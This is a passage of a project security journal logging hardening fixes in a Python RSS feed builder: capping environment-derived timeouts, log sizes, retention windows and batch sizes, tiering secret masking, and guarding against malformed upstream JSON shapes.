**Vulnerability:** `src/feed/config.py:STATE_RETENTION_DAYS = max(get_int_env("STATE_RETENTION_DAYS", DEFAULT_STATE_RETENTION_DAYS), 0)` enforced only a non-negative lower bound. The constant is consumed in `src/build_feed.py:_load_state` (line 621) as `now_utc - timedelta(days=feed_config.STATE_RETENTION_DAYS)` to discard `first_seen` entries older than the retention window. With `STATE_RETENTION_DAYS=99999999` (intentional misconfig, leaked CI env, compromised secret store) the `datetime - timedelta` arithmetic raises `OverflowError: date value out of range` — Python's datetime is bounded at year 1, and `now - timedelta(days=99999999)` underflows past year ~-271759. The error propagates out of `_load_state` past the `except FileNotFoundError, JSONDecodeError` and generic `except Exception as e` handlers (those wrap only the `json.load` block, not the post-load retention math) and crashes the whole feed-build pipeline. At non-overflow values too (e.g. 10000 days ≈ 27 years) the cap is effectively absent: every `first_seen` entry is retained forever and the on-disk state file grows unboundedly with each new RSS item the providers emit, eventually exhausting the disk and stalling the cron job. Same env-cap drift family already journaled for `LOG_MAX_BYTES` (Round 6) and `LOG_BACKUP_COUNT` (Round 7) — disk-exhaustion + crash, both via the same one-env-override surface.
**Learning:** The env-cap audit pattern previously walked four failure layers — network (Slowloris timeouts), API contract (daily quota), persistence-loss-window (`*_BATCH_SIZE`), and disk-exhaustion (`LOG_MAX_BYTES` / `LOG_BACKUP_COUNT`). This entry uncovers a *fifth*: env-derived integer that gates a `timedelta(days=...)` / `timedelta(hours=...)` / `timedelta(minutes=...)` arithmetic *and* feeds a `datetime - timedelta` expression. Python silently accepts very large `timedelta(days=N)` values (up to `timedelta.max.days = 999999999`) but the *subsequent* subtraction underflows whenever the result would be before year 1 (~273785 days for any current date). Same shape applies anywhere `timedelta(<unit>=ENV_CONST)` lands in arithmetic with a `datetime` — a separate concern from the size/byte/count caps Round 6/7 covered. The right ceiling for a retention-window constant is "anything that keeps `now - timedelta(...)` well within Python's datetime range AND bounds the on-disk file growth to something a CI runner can host"; 10 years (3650 days) is generous enough for legitimate long-running RSS-subscriber retention while bounded for any volume.
**Prevention:** Extend the env-cap audit grep to include any env-derived integer that flows into `timedelta(days=...)`, `timedelta(hours=...)`, `timedelta(minutes=...)`, `timedelta(seconds=...)`, or any sibling unit, especially when the result is then subtracted from / added to a `datetime`. Grep `timedelta\(\w+=` paired with `feed_config\.\w+_(DAYS|HOURS|MINUTES|SECONDS)` across `src/`. For each, ask "what is the largest retention/age window this constant should ever permit, regardless of operator intent?" Default cap shape is `min(max(get_int_env(...), 0), MAX_<NAME>)` next to the existing lower-bound clamp, with a security comment naming both the failure mode (`OverflowError` from `datetime - timedelta` underflow, plus disk growth at non-overflow values) and the worst-case formula. Other env vars in this repo with the same shape that may need future audit: `CACHE_MAX_AGE_HOURS` (`build_feed.py:223` — `timedelta(hours=...)` overflow at very large values), `MAX_ITEM_AGE_DAYS` / `ABSOLUTE_MAX_AGE_DAYS` (used as float comparisons, not directly in `timedelta`, but worth verifying), and per-provider equivalents in `wl_text.py`, `wl_fetch.py`, `feed/logging.py`. Test shape mirrors the established "99999999 → cap, 30 → tighten, 0/-5 → 0, unset → default, garbage → default" pattern in `tests/test_log_max_bytes_cap.py`.

## 2026-05-07 - Tiered-Masking Drift: Wizard `mask_value` Kept the Pre-2026-03-25 Shape
**Vulnerability:** `src/utils/configuration_wizard.py:mask_value` redacted any value longer than 4 chars as `f"{value[:2]}***{value[-2:]}"` and any value of 1–4 chars as `"*" * len(value)`. Same one-size-fits-all leak documented for `_sanitize_url_for_error` on 2026-03-25, but in a *parallel* masking helper that the original fix didn't touch. `scripts/configure_feed.py:_summarize_changes` calls `mask_value(after)` / `mask_value(before)` for every key ending in `_ACCESS_ID` and prints the result to stdout — so `VOR_ACCESS_ID` (typically 16 chars), the legacy `VAO_ACCESS_ID`, and any future `*_ACCESS_ID` secret showed `ab***yz` (4/16 = 25% of the secret) on every run of the wizard, plus 4/8 = 50% for any 8-char ID and 4/5 = 80% for an unusually short one. Terminal logs, screenshots and screen-recording captures pick up the wizard's summary verbatim, so the 25–80% leak survives in any artefact the operator shares for support — exactly the threat model that motivated the 2026-03-25 fix.
**Learning:** The 2026-03-25 entry's prevention rule ("tiered redaction logic that scales the visible portion based on the total length of the secret") was applied to *one* masking helper (`_mask_secret` in `src/utils/secret_scanner.py`). The codebase has a *second* masking helper that predates the same bug class — `mask_value` — and the 2026-03-25 audit didn't grep for sibling masking sites. The drift is the same shape as the cross-tree `or []` / env-cap drifts already journaled: a fix lands in one module, the prevention rule names the principle, but no one greps for sibling implementations of the same primitive. Two masking helpers in one repo is two drift surfaces for one fix.
**Prevention:** When fixing a masking / redaction primitive, grep for sibling implementations across the repo: `git grep -nE 'def \w*mask\w*\(value|"\*\*\*"|f"{value\[:|f"{value\[-'`. Every helper that takes a string and returns a partial-reveal form is in scope, including ones in `scripts/`, `src/utils/`, and per-module fallbacks. When more than one exists, either consolidate into one canonical implementation (preferred) or copy the tiered logic verbatim with a comment cross-referencing the canonical site so future readers see they are intentionally synchronised. The tier shape `≤8 → "***", ≤20 → 2+2, >20 → 4+4` is now the documented canonical contract; new masking helpers must mirror it, and `mask_value` now points to `_mask_secret` as the reference.

## 2026-05-07 - Env-Override Cap Drift Round 7: `LOG_BACKUP_COUNT` Is the Multiplier Round 6 Forgot
**Vulnerability:** `src/feed/config.py:LOG_BACKUP_COUNT = max(get_int_env("LOG_BACKUP_COUNT", 5), 0)` enforced only a non-negative lower bound, even after Round 6 capped `LOG_MAX_BYTES` at 100 MiB. The constant is consumed by both `RotatingFileHandler` instances in `src/feed/logging.py` (`errors.log` and `diagnostics.log`) as the count of rotated files retained per handler — i.e. the *multiplier* in the worst-case disk-footprint formula `2 * MAX_LOG_BYTES * (LOG_BACKUP_COUNT + 1)` that Round 6's own comment block named. The Round 6 entry's prevention rule explicitly listed `*_BACKUP_COUNT` as a follow-up audit target ("Grep for `RotatingFileHandler(.*maxBytes`, `*_MAX_BYTES`, `*_MAX_SIZE`, `*_RETENTION_DAYS`, `*_BACKUP_COUNT`"), but the round closed without filing the follow-up. With `LOG_BACKUP_COUNT=999999` (intentional misconfig, leaked CI env, compromised secret store), the per-file 100 MiB cap is defeated by an unbounded multiplier — worst case `2 * 100 MiB * 1_000_000 ≈ 190 TB`, easily filling any CI runner volume and re-enabling the same disk-fill cascade Round 6 thought it had closed.
**Learning:** A disk-footprint cap on size *per file* is incomplete if the *count* of retained files is uncapped — both factors live in the same `2 * SIZE * (COUNT + 1)` formula and bounding only one leaves the product unbounded. The "intentionally generous" framing from Round 6 (100x default) carries cleanly to the count axis: default 5 → cap 500, so the post-clamp worst case is `2 * 100 MiB * 501 ≈ 100 GiB` — high but bounded for any CI runner. Same TIGHTEN-only contract as Round 6, same shape (`min(max(get_int_env(...), 0), MAX_<NAME>)`), same test pattern (`99999 → cap, 12 → tighten, 0/-5 → 0, unset → default, garbage → default`). The bigger meta-pattern: when a Round-N entry names sibling constants in its prevention rule, the next round must audit *all* named siblings in one pass, not pick them off one per day; otherwise a partial fix gives operators a false sense of completion ("disk is capped now") while leaving a one-env-override bypass live.
**Prevention:** When a cap fix lands on one factor of a multi-factor disk/network/quota footprint formula, the prevention rule must enumerate *every other factor in the same formula* and the next-round audit must cover all of them in a single batch. Extract the formula into a comment at the constant declaration so future readers see the full risk arithmetic, not just the variable being clamped. Concretely, the disk-footprint formula `2 * MAX_LOG_BYTES * (MAX_LOG_BACKUP_COUNT + 1)` now lives at the top of `src/feed/config.py` so both factors are visible at the same site. Future audits of any compound-bound constant should grep for the formula's variables (`MAX_LOG_BYTES`, `MAX_LOG_BACKUP_COUNT`, `LOG_RETENTION_DAYS` if it ever lands) and verify each has its own TIGHTEN-only clamp.

## 2026-05-07 - Env-Override Cap Drift Round 6: `LOG_MAX_BYTES` Is the Disk-Exhaustion Surface
**Vulnerability:** `src/feed/config.py:LOG_MAX_BYTES = max(get_int_env("LOG_MAX_BYTES", 1_000_000), 0)` enforced only a non-negative lower bound. The constant is consumed by both `RotatingFileHandler` instances in `src/feed/logging.py` (`errors.log` and `diagnostics.log`) as the size threshold that triggers rotation. Previous rounds capped network/quota DoS surfaces (`VOR_HTTP_TIMEOUT`, `PROVIDER_TIMEOUT`, `BAUSTELLEN_TIMEOUT`, `VOR_MAX_REQUESTS_PER_DAY`, …), but the *disk-exhaustion* layer — how many bytes accumulate in a single log file before the rotation trigger fires — stayed uncapped. With `LOG_MAX_BYTES=999999999999` (intentional misconfig, leaked CI env, compromised secret store) the active log file would grow without rotation until the volume fills, stalling the cron pipeline (write failures crash subsequent `configure_logging` calls and any provider that emits a log line on the failure path). The two log files share the threshold so the worst-case disk footprint is `2 * LOG_MAX_BYTES * (LOG_BACKUP_COUNT + 1)`; without the cap a single env override could render a CI runner's volume unusable.
**Learning:** The env-cap audit pattern so far covered three failure layers: network (Slowloris timeouts), API contract (daily request quotas), and persistence-loss-window (`*_BATCH_SIZE` constants whose loss across SIGKILL re-enables contract breach). The disk-exhaustion layer is the natural fourth: any env-derived integer that gates an on-disk size, retention threshold, or backup count is in the same risk category. The `LOG_MAX_BYTES` cap is *intentionally generous* (100MB ≫ 1MB default), mirroring the `MAX_REQUEST_RETRIES = 10` precedent — operators can absorb verbose-debug runs without the env override mechanism becoming a single-line disk-DoS vector. A tight cap (`MAX = DEFAULT`) would block legitimate verbose-logging tuning; a generous cap (100x default) keeps that flexibility while bounding the disk footprint.
**Prevention:** Extend the env-cap audit grep to include any env-derived integer whose *physical meaning* is "an on-disk size that grows until trigger". Grep for `RotatingFileHandler(.*maxBytes`, `*_MAX_BYTES`, `*_MAX_SIZE`, `*_RETENTION_DAYS`, `*_BACKUP_COUNT` across `src/feed/config.py` and any other config-loader module. For each, ask "what is the largest disk footprint this constant should ever permit, regardless of operator intent?" Default cap shape is `min(max(get_int_env(...), 0), MAX_<NAME>)` next to the existing lower-bound clamp, and a security comment naming both the failure mode (disk fills, write failures cascade) and the worst-case disk footprint formula. The test shape mirrors the established "99999 → cap, 5 → tighten, 0 → preserved, unset → default, garbage → default" pattern in `tests/test_provider_timeout_cap.py`.

## 2026-05-07 - Env-Override Cap Drift Round 5: `VOR_QUOTA_FLUSH_BATCH_SIZE` Is the Persistence-Loss-Window Surface
**Vulnerability:** `src/providers/vor.py:QUOTA_FLUSH_BATCH_SIZE = max(1, _load_int_env("VOR_QUOTA_FLUSH_BATCH_SIZE", DEFAULT_QUOTA_FLUSH_BATCH_SIZE))` accepted any positive integer. Previous rounds capped `VOR_HTTP_TIMEOUT` (Slowloris), `VOR_MAX_REQUESTS_PER_DAY` (contract limit), and `VOR_MAX_STATIONS_PER_RUN` (fan-out × contract limit), but the *persistence* surface — how much in-memory quota delta accumulates before the next disk flush — stayed uncapped. The `_QUOTA_CACHE["unsaved_delta"]` counter only flushes when `unsaved_delta >= QUOTA_FLUSH_BATCH_SIZE` or via the `atexit`-registered `_flush_quota_cache` (line 126). The atexit handler does NOT run on SIGKILL, OOM kill, kernel panic, or container reaper — those are exactly the failure modes a multi-tenant CI runner has to plan for. With `VOR_QUOTA_FLUSH_BATCH_SIZE=99999`, a single run can accumulate the whole 100/day VAO budget in memory, and one abnormal kill silently drops the count; the next run reads a stale (or zero) on-disk total and is free to make another 100 requests before the daily quota gate kicks in — a direct breach of the VAO Start tier's 100/day contract that risks suspension of the access ID. Same threat vector as `VOR_MAX_REQUESTS_PER_DAY=99999` (the previously-fixed sibling), but expressed via the *durability layer* rather than the *limit layer*.
**Learning:** The journal pattern "cap env-loaded ints feeding contract-relevant constants" so far focused on the *limit* itself (max requests, max fan-out) and on *resource-budget* constants (HTTP timeout). It missed the *persistence/durability* layer — the constant that controls how much state can be lost in a single crash. The two layers are different shapes (one bounds the value an operator may set, the other bounds the in-memory window that survives a crash) but the security ceiling is the same: in-memory state larger than the daily contract cap means a single crash event can re-enable a contract violation on the next run. The right ceiling for any "loss window" or "batch flush" constant is the contract limit itself, not the configured default — buffering more than the daily cap in memory is by definition wasteful (the per-call fail-fast in `save_request_count` already blocks at `MAX_REQUESTS_PER_DAY`), and any operator value above that ceiling is purely a DoS-via-crash vector with no defensible benefit.
**Prevention:** Extend the env-cap audit to include any constant whose *physical meaning* is "in-memory state that survives only to the next flush" — grep for `atexit.register`, `_flush_*`, `*_BATCH_SIZE`, `*_BUFFER_SIZE`, `unsaved_delta`-style counters, and any `if counter >= BATCH_LIMIT: flush()` shape. For each, ask "what is the largest in-memory accumulation this constant should ever bound, regardless of operator intent?" The answer for a quota counter is always the daily quota itself (or whatever contractual / billing / rate-limit gate the eventual consumer enforces). Cap with `min(_load_int_env(...), CONTRACT_LIMIT)` next to the existing lower-bound clamp, and add a security comment naming both the failure mode (SIGKILL/OOM kill loses unflushed delta) and the consequence (next-run contract breach). The test shape mirrors the established "99999 → cap, 5 → tighten, unset → default" three-case pattern in `tests/test_vor_env.py:test_max_*`.

## 2026-05-07 - Env-Override Cap Drift to Sibling Fan-Out Constant: `VOR_MAX_STATIONS_PER_RUN`
**Vulnerability:** `src/providers/vor.py:MAX_STATIONS_PER_RUN = _load_int_env("VOR_MAX_STATIONS_PER_RUN", DEFAULT_MAX_STATIONS_PER_RUN)` accepted any positive integer. The 2026-05-06 `VOR_MAX_REQUESTS_PER_DAY` journal entry explicitly listed `VOR_MAX_STATIONS_PER_RUN` as needing a follow-up audit ("the same pattern likely applies elsewhere … `VOR_MAX_STATIONS_PER_RUN` for fan-out"), but the round was deferred. A benign-looking env override `VOR_MAX_STATIONS_PER_RUN=99999` (intentional misconfig, leaked CI env, compromised secret store) lets a single feed-build run select the *whole* station list at once, blowing through the 100/day VAO Start daily budget in one round-robin slice and DoS'ing the thread pool (`VOR_MAX_WORKERS=10`) with pending fetches. Round-robin distribution collapses (every run picks the same large slice rather than rotating). The `MAX_REQUESTS_PER_DAY` quota gate stops *actual* HTTP calls but nothing prevents the worker pool from serializing on the lock for the whole run.
**Learning:** Env-override caps should be applied to the *whole family* of related constants in one batch, not one at a time when each is "next touched". The `VOR_MAX_REQUESTS_PER_DAY` journal entry already named `VOR_MAX_STATIONS_PER_RUN` as a follow-up; that follow-up sat unfixed for a day because no one was actively touching the constant. The defense-in-depth layering matters: the daily-quota cap stops contract violation but the fan-out cap stops *worker-pool DoS via wasteful task scheduling*. The right ceiling for a per-run fan-out is the daily quota itself — fanning out more stations per run than the daily budget is by definition wasteful regardless of intent.
**Prevention:** When a journal entry calls out sibling constants needing audit, file a same-day follow-up before closing the original entry. Grep `_load_int_env\(["\']VOR_` (and similar for other prefixes) to enumerate every env-loaded integer; for each, ask "what is the upper bound this constant should never exceed regardless of operator intent?" Cap with `min(_load_int_env(...), CONTRACT_OR_RESOURCE_CEILING)` and add a security comment naming the consequence of bypass and the ceiling's source. Test shape: parametrised reload of the module with `99999` env override asserting the cap is enforced, plus a smaller value (e.g. 5) asserting the env can still tighten below the cap.

## 2026-05-07 - `or []` / `or {}` Drift Round 4: WL `fetch_events` Per-Element Field Lookups Stayed Unguarded
**Vulnerability:** Round 2 (`_extract_wl_items` filtering) ensured each `ti` / `poi` iterated by `fetch_events` is a `dict` — but only at the *list* boundary. The per-iteration `attrs = ti.get("attributes") or {}`, `tinfo = ti.get("time") or {}`, `attrs = poi.get("attributes") or {}`, `tinfo = poi.get("time") or {}` (and the chained `(obj.get("attributes") or {}).get(...)` calls inside `_best_ts`) all kept the canonical `or {}` drift shape. A misbehaving / compromised upstream peer that ships `{"trafficInfos": [{"attributes": [1, 2], ...}]}` or `{"trafficInfos": [{"time": "evil_string", ...}]}` passes the per-element `isinstance(item, dict)` filter at the source, then crashes with `AttributeError: 'list' object has no attribute 'get'` (or `'str' object has no attribute 'get'`) on the very next `attrs.get("status")` / `tinfo.get("start")`. The `for ti in _fetch_traffic_infos(...)` loop has no per-iteration `try/except`, so the `AttributeError` propagates out of `fetch_events` → `update_wl_cache.py`'s defensive `except Exception:` → silently disables the WL cache refresh.
**Learning:** The Round 2 fix's *learning* was "factor out `_extract_wl_items` with a per-element `isinstance(item, dict)` filter" — but the per-element filter only validates one level deep. The next layer of nested fields (`attributes`, `time`) is still `Any`, and the same `or {}` drift recurs *inside* the loop body. Treat every `<dict>.get(<field>) or {}` / `<dict>.get(<field>) or []` as a separate drift point even when the outer `<dict>` is already shape-checked. The per-element filter is a *necessary* guard for the iteration shape but does not cover the *value* shape of nested fields.
**Prevention:** When the Zero-Trust audit grep `\.get\(.*\)\s*or\s*\{\}` / `\.get\(.*\)\s*or\s*\[\]` matches inside a loop whose iterator was already filtered by an `isinstance(item, dict)` step, treat every match as still in-scope — the filter at the boundary doesn't propagate to nested field lookups. The fix shape is a tiny module-private helper (`_coerce_dict(value: Any) -> dict[str, Any]`) reused across every site, with a docstring naming the drift round + threat (so future readers understand why an `isinstance` check is preferable to `or {}`). Add parametrised regression tests covering both falsy and *truthy non-dict* shapes (`[1, 2]`, `"abc"`, `42`, `True`) for every helper that consumes external JSON; the truthy non-dict cases are exactly the ones an attacker would ship to bypass the existing falsy-default contract.

## 2026-05-07 - `or []` / `or {}` Drift Round 3: VOR `resolve_station_ids` Hid Behind a Direct Subscript
**Vulnerability:** Round 2 (above) extended the audit grep to chained `(... or {}).get(... ) or []` and the per-element `isinstance(dict)` filter and patched WL's `_extract_wl_items`. The next round's grep `\.get\(.*\)\s*or\s*\[\]` still missed `src/providers/vor.py:resolve_station_ids` because the offending site mixed two different shapes in one block: (a) a direct subscript `stops = payload["StopLocation"]` (no `.get(...)`, no `or []`, so the audit regex doesn't match at all) and (b) a sibling `stops = location_list.get("Stop") or []` (canonical drift) — both feeding the same downstream `for stop in stops:` loop. A tampered VAO `location.name` upstream that returns `{"StopLocation": 42}`, `{"StopLocation": True}`, `{"LocationList": {"Stop": "x"}}`, or `{"LocationList": {"Stop": [True, "y"]}}` raises `TypeError` from the iteration (or, for strings, silently iterates characters with `isinstance(stop, Mapping): continue` masking the failure as "0 results"). The `for name in to_lookup:` outer loop has no try/except around the post-fetch processing, so one bad payload aborts the whole batch — *after* the API call has already debited quota for that name and *before* any subsequent name's fetch runs.
**Learning:** The Round 2 grep `\.get\(.*\)\s*or\s*\[\]` / `\.get\(.*\)\s*or\s*\{\}` is necessary but assumes the unsafe extraction goes through `.get(...)`. Direct subscript access (`payload["key"]`, `data["a"]["b"]`) is the *worse* shape — it has no fallback at all, will raise `KeyError` on missing keys (caught by `if "X" in payload:`) but pass any value through unchecked. The two shapes are usually adjacent: a code reviewer thinks "this branch uses `if X in payload: payload[X]` so KeyError is impossible" and forgets that a present-but-misshapen value is the actual threat. Sibling helpers in the same repo (`scripts/update_vor_stations.py:628-634`) already had the canonical `isinstance(raw_stops, Mapping)` / `isinstance(raw_stops, list)` shape pattern, but the audit didn't grep across `src/` and `scripts/` for the *same JSON key name* — only for the unsafe expression syntax.
**Prevention:** Extend the Zero-Trust audit grep to include direct subscript variants: `payload\[["\']\w+["\']\]`, `data\[["\']\w+["\']\]`, anywhere the result is then iterated (`for .* in <result>:`). When the pattern recurs, search for the JSON key name itself (e.g. `git grep -nE '"StopLocation"|"LocationList"|"Stop"'`) across `src/` AND `scripts/` to enumerate every consumer of the same upstream contract — the right fix shape is invariant across them, so a sibling that already has the guards is the canonical reference. The fix shape: bind the raw value to an explicitly `object`-typed local, dispatch on `isinstance(raw, Mapping)` (single-item HAFAS shape) → wrap in list, `isinstance(raw, list)` → filter to Mapping elements via list comprehension, `else` → empty list. The per-element filter at the source means the inner loop can drop its inline `isinstance(stop, Mapping): continue` guard.

## 2026-05-07 - `or []` / `or {}` Drift Round 2: WL `_fetch_traffic_infos` / `_fetch_news` Chained Two Together
**Vulnerability:** The 2026-05-07 audit that caught `scripts/update_baustellen_cache.py:_iter_features` (single `or []`) extended its grep to `\.get\(.*\)\s*or\s*\[\]` and `\.get\(.*\)\s*or\s*\{\}` but stopped at the *first* match per file. `src/providers/wl_fetch.py:_fetch_traffic_infos` and `_fetch_news` chained the pattern: `(data.get("data", {}) or {}).get("trafficInfos", []) or []`. `_get_json` validates the top-level is a dict, but `data["data"]` is still `Any` — a truthy non-Mapping shape (`{"data": [1, 2]}`, `{"data": "abc"}`, `{"data": True}`) passes the `or {}` (truthy, returned unchanged) and then crashes on `.get("trafficInfos", [])` with `AttributeError: 'list' object has no attribute 'get'`. Same drift on the inner step: a truthy non-list `data["data"]["trafficInfos"]` (e.g. `42`, `"x"`, `True`) bypasses the trailing `or []` and the `for ti in <result>:` loop in `fetch_events` raises `TypeError` (int/bool not iterable) or `AttributeError` (each iterated character/key is a `str`, no `.get`). Both failure modes propagate out of `fetch_events` → caught by `update_wl_cache.py`'s defensive `except Exception:` → silently disables the WL cache refresh.
**Learning:** A single `or {}` / `or []` is an obvious smell once the audit grep is in place. A *chained* one — `(get(..., {}) or {}).get(..., []) or []` — looks like extra defence to a casual reader but has *two* drift points stacked: each `.get(...)` returns `Any` and each `or {}/or []` only catches falsy shapes. The two failure modes are different (outer = `AttributeError` because lists have no `.get`; inner = `AttributeError`/`TypeError` during iteration), so a single test case won't catch both. The extracted helper shape (`_extract_wl_items(data, key)`) replaces the chain with two explicit `isinstance` guards plus a per-element `isinstance(item, dict)` filter; per-element guard matters because `fetch_events` later does `ti.get("attributes")` on each iterated item, which would crash if any element were non-dict.
**Prevention:** When the Zero-Trust grep `\.get\(.*\)\s*or\s*\[\]` / `\.get\(.*\)\s*or\s*\{\}` matches, also grep for *chained* forms: `\.get\([^)]+\)\s*or\s*\{\}\)\.get\(`, `\(.*or\s*\{\}\)\.get\(`, and the semantic equivalent with parentheses. Each step in a chain is a separate drift point. When the consumer iterates the result (`for x in <result>:`) and then calls `.get(...)` on each iterated value, add a per-element `isinstance(item, dict)` filter at the source — don't rely on every consumer to add the guard inline. Factor out a shared helper as soon as the same chain repeats across two functions; that's the moment the inline form's "extra `or` for safety" excuse becomes a copy-paste vehicle for the next drift.

## 2026-05-07 - Zero-Trust `for x in payload` Drift: `_iter_features` Used `or []` Without Shape Guard
**Vulnerability:** The 2026-05-07 Zero-Trust audit fixed every `parse → .get(...)` site (`scripts/enrich_station_aliases.py:_load_vor_mapping`, `scripts/update_wl_stations.py:load_vor_mapping`, `src/providers/vor.py:_load_station_name_map`) and every `parse → for-loop` site it could find (`scripts/update_station_directory.py:_load_pendler_alternative_names` etc.) by adding `isinstance(raw, list)` before iteration. It missed `scripts/update_baustellen_cache.py:_iter_features`, which extracted `features` via `payload.get("features") or []` — the `or []` collapses *falsy* JSON shapes (`None`, `0`, `""`, `[]`) but lets *truthy non-lists* through. A misbehaving / compromised upstream WFS endpoint (or a tampered local fallback file) could ship `{"features": 42}`, `{"features": True}`, `{"features": "abc"}`, or `{"features": {"a":"b"}}`; the resulting `[f for f in features if isinstance(f, dict)]` then either raised `TypeError` (int/bool — not iterable, not caught by `_collect_events` and crashing the cron) or silently iterated dict keys / string characters and emitted zero events while looking like a healthy "empty upstream" pass. Same drift shape as the previously-fixed sibling loaders, but on the cache-update script the audit kept skipping over.
**Learning:** The 2026-05-07 prevention rule for `for x in payload` checked for *missing* iteration guards but did not catch the *insufficient* iteration guard expressed via `or []`. `payload.get("features") or []` reads as "default to empty list", but its actual contract is "default to empty list **only for falsy values**". Truthy non-list shapes — exactly the ones an attacker would ship to bypass parse-error handling — pass straight through. The fix shape is identical to the sibling loaders: drop the `or []`, hold the value as `Any`, then `isinstance(features, list)` before the comprehension; mirror the `return []` fallback already in place for the `else:` branch.
**Prevention:** Extend the Zero-Trust audit grep to include `\.get\(.*\)\s*or\s*\[\]` and `\.get\(.*\)\s*or\s*\{\}` — any expression that uses `or` to default a JSON-extracted value of `Any` type to an empty container. The `or` chain looks defensive but only covers half the failure surface (falsy → default), leaving the other half (truthy non-container → TypeError or silent zero-result) untouched. The right shape is always an explicit `isinstance(value, list|Mapping)` check after the extraction, not a fallback expression. Pair with `[f for f in <expr>` / `for x in payload.get(...)` searches — the comprehension hides the iteration step but has the same blast radius as a literal `for` loop.

## 2026-05-07 - Slowloris-Cap Drift Round 3: `BAUSTELLEN_TIMEOUT` Was the Last Uncapped HTTP-Fetch Env in `scripts/`
**Vulnerability:** The 2026-05-06 / 2026-05-07 Slowloris-cap audit landed at every provider tier (`VOR_HTTP_TIMEOUT` capped at `DEFAULT_HTTP_TIMEOUT`), at the Google Places consumer (`MAX_TIMEOUT_S=25.0`), and at the orchestrator tier (`MAX_PROVIDER_TIMEOUT` plus per-provider clamp). It missed `scripts/update_baustellen_cache.py:main` where `BAUSTELLEN_TIMEOUT` was read via `max(int(timeout_raw), 1)` — only enforcing a *lower* bound. The value was passed straight to `_fetch_remote(...)` → `fetch_content_safe(..., timeout=timeout, ...)` as both connect and read budget. An env override `BAUSTELLEN_TIMEOUT=99999` would let a sluggish or attacker-controlled upstream peer (the OGD WFS endpoint at `data.wien.gv.at`) hold the cron job for ~28 hours, stalling the whole feed-build pipeline — same blast radius as the previously-fixed `REQUEST_TIMEOUT_S` and `PROVIDER_TIMEOUT` paths but on a sibling script that the previous audits skipped.
**Learning:** This is the *third* consecutive Slowloris-cap drift in five days. Previous rounds caught the provider tier (Round 1: VOR), the consumer dataclass (Round 2: GooglePlacesConfig fields), and the orchestrator tier (Round 3: PROVIDER_TIMEOUT + per-provider overrides). Each round's prevention rule named "the next surface" but the audits kept stopping at `src/`. The pattern that recurred this time: a *script-level* env read (`os.getenv` → `int(...)` → passed to `fetch_content_safe`) lives in `scripts/update_*_cache.py` files that don't import `feed/config.py` and therefore don't inherit the `MAX_PROVIDER_TIMEOUT` ceiling. The right grep is `os.getenv\(.*TIMEOUT\|env\.get\(.*TIMEOUT\|env\.get\(.*REQUEST_TIMEOUT` across the *whole repo* (not just `src/`), paired with `fetch_content_safe\|requests\.\(get\|post\|request\)` as the consumer signal.
**Prevention:** When auditing Slowloris caps, treat `scripts/update_*.py` as a peer of `src/providers/` — every cron-runnable script that fetches an HTTP resource has the same blast radius as a provider, because they share the same `fetch_content_safe` consumer. The fix shape is unchanged: a module-level `MAX_<NAME>_TIMEOUT = DEFAULT_<NAME>_TIMEOUT` constant adjacent to the existing `DEFAULT_*` declarations, and `min(max(int(raw), 1), MAX_<NAME>_TIMEOUT)` at the env-read site so the env can only *tighten*. Add a parametrised regression test asserting that override values 99999, default+1, the default itself, 0, -5, "", and "garbage" all collapse to the documented post-clamp range — the same shape as `tests/test_*_timeout_*` for the previously-fixed surfaces.

## 2026-05-07 - Slowloris-Cap Drift to the Orchestrator: `PROVIDER_TIMEOUT` and `PROVIDER_TIMEOUT_<X>` Were Uncapped
**Vulnerability:** The 2026-05-06 / 2026-05-07 Slowloris-cap audit covered every per-provider HTTP timeout in `src/providers/` (`VOR_HTTP_TIMEOUT` capped at `DEFAULT_HTTP_TIMEOUT=15`) and every Google Places consumer (`MAX_TIMEOUT_S=25.0` enforced in `GooglePlacesConfig.__post_init__`), but missed the *orchestrator-level* timeout in `src/feed/config.py:_load_from_env`. `PROVIDER_TIMEOUT = max(get_int_env("PROVIDER_TIMEOUT", DEFAULT_PROVIDER_TIMEOUT), 0)` only enforced a non-negative lower bound. The same drift applied to per-provider overrides resolved by `src/build_feed.py:_provider_timeout_override` (`PROVIDER_TIMEOUT_<X>`, `<X>_TIMEOUT`, plus `_provider_timeout_env`-attribute overrides), which fed through `_read_optional_non_negative_int` with no upper bound. Both values are consumed in `build_feed.py` as (a) the per-fetch HTTP timeout passed to provider fetch callables and (b) the deadline on each `ThreadPoolExecutor` future — so an env override `PROVIDER_TIMEOUT=99999` (or `PROVIDER_TIMEOUT_VOR=99999`) would let a sluggish or attacker-controlled upstream peer hold a worker for ~28 hours per fetch, stalling the whole feed-build cron.
**Learning:** Slowloris caps already lived at every *provider* layer, but the *orchestrator* layer that fans out across all providers was treated as just glue and silently inherited the unbounded env shape. The drift is "vertical" rather than the previously-journaled "horizontal" drifts (sibling field, sibling script, sibling tree): it happens between the provider tier and the orchestrator that schedules them. Any audit of timeout/retry caps must walk *up* the stack, not just sideways across siblings — if every provider individually caps its HTTP timeout but the orchestrator gives each call a longer deadline, the cap is effectively whichever is larger. The per-provider override path is especially insidious because it bypasses the global `feed_config.PROVIDER_TIMEOUT` entirely (it goes straight from `_resolve_provider_override` into `effective_timeout`).
**Prevention:** When provider-layer timeouts have been capped, also audit every orchestrator-layer timeout that *contains* the providers — search for `ThreadPoolExecutor`, `concurrent.futures`, `asyncio.gather`, `wait(...)` paired with an env-controlled deadline. The fix shape is to introduce a `MAX_<NAME>` constant equal to the default, clamp `PROVIDER_TIMEOUT = min(max(get_int_env(...), 0), MAX_PROVIDER_TIMEOUT)`, AND clamp every per-provider override at the consumer site (`return min(value, feed_config.MAX_PROVIDER_TIMEOUT)` inside `_provider_timeout_override`). The grep pattern this turn is: any function returning a value that lands in `effective_timeout`, `future.result(timeout=...)`, `wait(..., timeout=...)`, or `executor.submit(...)`-deadline math without an intervening `min(..., MAX_*)` clamp.

## 2026-05-07 - Slowloris-Cap Drift Sibling: `REQUEST_MAX_RETRIES` Also Needed the Consumer-Layer Ceiling
